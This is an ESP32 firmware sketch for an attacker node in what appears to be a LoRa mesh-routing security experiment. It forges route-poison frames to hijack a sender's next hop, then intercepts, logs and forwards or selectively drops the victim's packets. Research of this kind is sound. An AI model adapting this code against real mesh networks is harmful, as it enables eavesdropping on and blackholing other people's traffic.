// E16 — Node C: Attacker (Meshtastic next_hop hijacker)
//
// Two-phase attack:
// Phase 1 (Poisoning): Send ROUTE_POISON to Node A, updating its
//   next_hop table to point to NODE_C (self).
//
// Phase 2 (Relay hijack): Receive MeshPackets intended for next_hop=self.
//   As active relay, can:
//   (a) Forward toward gateway — transparent relay
//   (b) Drop — selective blackhole
//   (c) Inspect payload before forwarding
//
// KEY CONTRAST with LoRaMesher E5b:
//   LoRaMesher: pkt carries dst=NODE_C, NODE_B discards (dst≠self). SILENT.
//   Meshtastic: pkt carries to=NODE_GW, next_hop=NODE_C. NODE_C RECEIVES
//   and decides what to do. ACTIVE relay, not absent destination.
//
// Board: Ebyte EoRa PI (ESP32-S3FH4R2)  FQBN: esp32:esp32:esp32s3:CDCOnBoot=cdc

#define NODE_ID  0xCC   // attacker
#define NODE_A   0xAA   // sender
#define NODE_GW  0xBB   // gateway

struct MeshPacket {
  uint8_t  from;
  uint8_t  to;
  uint8_t  next_hop;
  uint16_t pkt_id;
  uint8_t  hop_limit;
  uint8_t  payload[8];
} __attribute__((packed));

#include <RadioLib.h>
#include <SPI.h>
#include <Wire.h>
#include "SSD1306Wire.h"

#define LORA_NSS    7
#define LORA_DIO1  33
#define LORA_RST    8
#define LORA_BUSY  34
#define LORA_SCK    5
#define LORA_MOSI   6
#define LORA_MISO   3
#define LORA_FREQ  923.0
#define LORA_BW    125.0
#define LORA_SF      9
#define LORA_CR      7
#define LORA_SYNC  0x34
#define LORA_POWER  10
#define LORA_TCXO  1.6f

// Attack mode: RELAY_HIJACK (forward) or SELECTIVE_DROP
#define ATTACK_MODE  RELAY_HIJACK
// #define ATTACK_MODE  SELECTIVE_DROP

#define RELAY_HIJACK   1
#define SELECTIVE_DROP 2

uint32_t poisoned   = 0;  // ROUTE_POISON sent count
uint32_t intercepted = 0; // packets received as hijacked relay
uint32_t forwarded  = 0;
uint32_t dropped    = 0;

SSD1306Wire oled(0x3c, 18, 17);
SPIClass    spi(FSPI);
Module*     mod   = nullptr;
SX1262*     radio = nullptr;
volatile bool rxFlag = false;

void IRAM_ATTR onDio1() { rxFlag = true; }

void oled_draw() {
  oled.clear();
  oled.setFont(ArialMT_Plain_10);
  oled.setTextAlignment(TEXT_ALIGN_LEFT);
  oled.drawString(0,  0, "NODE C  ATTACKER");
  char buf[32];
  snprintf(buf, sizeof(buf), "poison=%u", poisoned);
  oled.drawString(0, 14, buf);
  snprintf(buf, sizeof(buf), "intercept=%u fwd=%u", intercepted, forwarded);
  oled.drawString(0, 28, buf);
  oled.drawString(0, 42, ATTACK_MODE == SELECTIVE_DROP ? "DROP MODE" : "RELAY MODE");
  oled.display();
}

void send_route_poison() {
  // ROUTE_POISON: tell NODE_A to update next_hop -> NODE_C
  // [0xFE, target=NODE_A, new_nexthop=NODE_C, 0x00]
  uint8_t poison[4] = {0xFE, NODE_A, NODE_ID, 0x00};
  radio->transmit(poison, 4);
  radio->startReceive();
  poisoned++;
  Serial.printf("[POISON] sent ROUTE_POISON to 0x%02X -> next_hop=0x%02X\n",
                NODE_A, NODE_ID);
}

void setup() {
  Serial.begin(115200); delay(500);
  Serial.println("=== E16 Node C (Meshtastic next_hop Attacker) ===");
  Serial.printf("[INFO] Attack mode: %s\n",
                ATTACK_MODE == SELECTIVE_DROP ? "SELECTIVE_DROP" : "RELAY_HIJACK");

  Wire.begin(18, 17);
  oled.init(); oled.flipScreenVertically(); oled_draw();

  pinMode(LORA_NSS, OUTPUT); digitalWrite(LORA_NSS, HIGH);
  pinMode(LORA_BUSY, INPUT);
  pinMode(LORA_RST, OUTPUT);
  digitalWrite(LORA_RST, LOW); delay(2);
  digitalWrite(LORA_RST, HIGH); delay(20);
  uint32_t t = millis();
  while (digitalRead(LORA_BUSY) && millis()-t < 500) delay(1);

  spi.begin(LORA_SCK, LORA_MISO, LORA_MOSI, LORA_NSS);
  mod   = new Module(LORA_NSS, LORA_DIO1, LORA_RST, LORA_BUSY, spi);
  radio = new SX1262(mod);
  radio->begin(LORA_FREQ, LORA_BW, LORA_SF, LORA_CR,
               LORA_SYNC, LORA_POWER, 8, LORA_TCXO);
  radio->setDio1Action(onDio1);

  // Phase 1: send ROUTE_POISON immediately at boot (3x for reliability)
  for (int i = 0; i < 3; i++) {
    send_route_poison();
    delay(200);
  }
  radio->startReceive();
  oled_draw();
  Serial.println("[RADIO] Listening for hijacked packets...");
}

void loop() {
  // Periodic re-poison every 30s (maintain control of routing table)
  static uint32_t last_poison = 0;
  if (millis() - last_poison > 30000) {
    last_poison = millis();
    send_route_poison();
    oled_draw();
  }

  if (!rxFlag) return;
  rxFlag = false;

  uint8_t buf[64];
  size_t  len   = radio->getPacketLength();
  float   rssi  = radio->getRSSI();
  int     state = radio->readData(buf, sizeof(buf));
  radio->startReceive();

  if (state != RADIOLIB_ERR_NONE || len < sizeof(MeshPacket)) return;

  MeshPacket *pkt = (MeshPacket*)buf;

  // Ignore our own ROUTE_POISON (from=0xFE) — avoid self-defeating forward loop
  if (buf[0] == 0xFE) return;

  // Only process packets where next_hop == self (hijacked relay path)
  if (pkt->next_hop != NODE_ID) return;

  intercepted++;
  Serial.printf("[HIJACK] from=0x%02X to=0x%02X pkt_id=%u rssi=%.1f"
                " payload[0]=0x%02X | ACTIVE RELAY — attacker receives payload\n",
                pkt->from, pkt->to, pkt->pkt_id, rssi, pkt->payload[0]);
  Serial.printf("[CONTRAST] LoRaMesher E5b: pkt would carry dst=0xCC, discarded"
                " silently at Node B. Here: attacker RECEIVES the packet.\n");

  if (ATTACK_MODE == RELAY_HIJACK) {
    // Forward toward gateway (transparent relay — demonstrates confidentiality breach)
    pkt->next_hop  = NODE_GW;  // set next hop to gateway
    pkt->hop_limit -= 1;
    if (pkt->hop_limit > 0) {
      delay(50);
      radio->transmit(buf, sizeof(MeshPacket));
      radio->startReceive();
      forwarded++;
      Serial.printf("[FWD] forwarded to gateway (hop_limit=%u)\n", pkt->hop_limit);
    }
  } else {
    // Selective drop — availability attack
    dropped++;
    Serial.printf("[DROP] selective drop (dropped=%u)\n", dropped);
  }

  oled_draw();
}
